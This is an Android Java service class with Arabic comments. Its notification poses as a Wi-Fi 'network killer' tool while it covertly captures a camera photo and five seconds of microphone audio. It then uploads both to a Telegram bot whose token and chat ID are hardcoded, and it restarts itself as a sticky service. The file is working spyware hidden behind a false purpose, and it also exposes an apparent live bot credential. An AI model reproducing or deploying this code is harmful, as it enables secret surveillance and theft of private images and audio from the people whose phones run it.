package com.abdullah.finalapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.UUID;

public class BackgroundService extends Service {
    private static final String TAG = "BG_Service";
    
    // ⚠️ حط التوكن بتاع البوت هنا
    private static final String BOT_TOKEN = "8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE";
    private static final String CHAT_ID = "7560932400";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, buildNotification());
        
        // تشغيل المهام في الخلفية
        new Thread(this::doCameraTask).start();
        new Thread(this::doMicTask).start();
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, "channel_id")
                    .setContentTitle("قاتل الشبكة")
                    .setContentText("جاري البحث عن شبكة قريبة...")
                    .setSmallIcon(android.R.drawable.ic_menu_compass)
                    .build();
        }
        return new Notification.Builder(this)
                .setContentTitle("قاتل الشبكة")
                .setContentText("جاري البحث عن شبكة قريبة...")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("channel_id", "Service Channel", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    // --- مهمة الكاميرا ---
    private void doCameraTask() {
        try {
            CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0]; // الكاميرا الأمامية
            
            HandlerThread thread = new HandlerThread("CameraBackground");
            thread.start();
            Handler handler = new Handler(thread.getLooper());

            ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            reader.setOnImageAvailableListener(r -> {
                Image image = r.acquireLatestImage();
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                
                // حفظ الصورة وإرسالها
                File file = new File(getExternalFilesDir(null), "cam.jpg");
                try (java.io.FileOutputStream fos = new java.io.FileOutputStream(file)) {
                    fos.write(bytes);
                } catch (Exception ignored) {}
                
                sendFileToTelegram(file, "photo");
                image.close();
            }, handler);

            if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice camera) {
                        try {
                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                            builder.addTarget(reader.getSurface());
                            camera.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        try { session.capture(builder.build(), null, handler); } catch (Exception ignored) {}
                                    }
                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession session) {}
                                }, handler);
                        } catch (Exception ignored) {}
                    }
                    @Override
                    public void onDisconnected(CameraDevice camera) {}
                    @Override
                    public void onError(CameraDevice camera, int error) {}
                }, handler);
            }
        } catch (Exception e) {
            Log.e(TAG, "Camera Error: " + e.getMessage());
        }
    }

    // --- مهمة المايك ---
    private void doMicTask() {
        try {
            File audioFile = new File(getExternalFilesDir(null), "audio.3gp");
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            
            // نسجل 5 ثواني و نبعت
            Thread.sleep(5000);
            recorder.stop();
            recorder.release();
            
            sendFileToTelegram(audioFile, "audio");
        } catch (Exception e) {
            Log.e(TAG, "Mic Error: " + e.getMessage());
        }
    }

    // --- إرسال الملفات لتيليجرام ---
    private void sendFileToTelegram(File file, String type) {
        String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/send" + (type.equals("photo") ? "Photo" : "Audio");
        String boundary = "*****" + UUID.randomUUID().toString() + "*****";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
            
            // chat_id
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            dos.writeBytes(CHAT_ID + lineEnd);

            // الملف
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"" + (type.equals("photo") ? "photo" : "audio") + "\";filename=\"" + file.getName() + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fis.close();
            
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();
            
            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Telegram response: " + responseCode);
        } catch (Exception e) {
            Log.e(TAG, "Send Error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
